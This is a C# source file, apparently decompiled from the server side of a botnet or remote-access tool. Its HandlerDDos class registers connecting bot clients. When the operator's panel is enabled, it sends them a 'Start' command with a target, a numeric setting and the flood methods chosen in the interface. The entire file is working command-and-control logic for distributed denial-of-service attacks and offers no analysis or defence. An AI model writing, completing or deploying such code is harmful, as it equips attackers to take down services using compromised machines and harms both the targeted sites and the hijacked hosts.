using System.Collections.Generic;
using System.Windows.Forms;
using Server.Connectings;

namespace Server.Messages;

internal class HandlerDDos
{
	public static void Read(Clients clients, object[] array)
	{
		if (clients == null || array == null || array.Length < 2)
		{
			if (clients != null)
			{
				clients.Disconnect();
			}
		}
		else
		{
			if (!((string)array[1] == "Connect"))
			{
				return;
			}
			if (Program.form.DDos.work)
			{
				clients.Hwid = (string)array[2];
				clients.eventDisconnect += delegate
				{
					Program.form.DDos.Invoke((MethodInvoker)delegate
					{
						Program.form.DDos.clients.Remove(clients);
					});
				};
				Program.form.DDos.Invoke((MethodInvoker)delegate
				{
					Program.form.DDos.clients.Add(clients);
				});
				if (!Program.form.DDos.materialSwitch7.Checked)
				{
					return;
				}
				List<object> list = new List<object>
				{
					"Start",
					Program.form.DDos.rjTextBox1.Texts,
					(int)Program.form.DDos.numericUpDown2.Value
				};
				foreach (Control control in Program.form.DDos.panel2.Controls)
				{
					if (control is CheckBox)
					{
						CheckBox checkBox = (CheckBox)control;
						if (checkBox.Checked)
						{
							list.Add(checkBox.Text.Replace(" ", ""));
						}
					}
				}
				clients.Send(list.ToArray());
			}
			else
			{
				clients.Disconnect();
			}
		}
	}
}
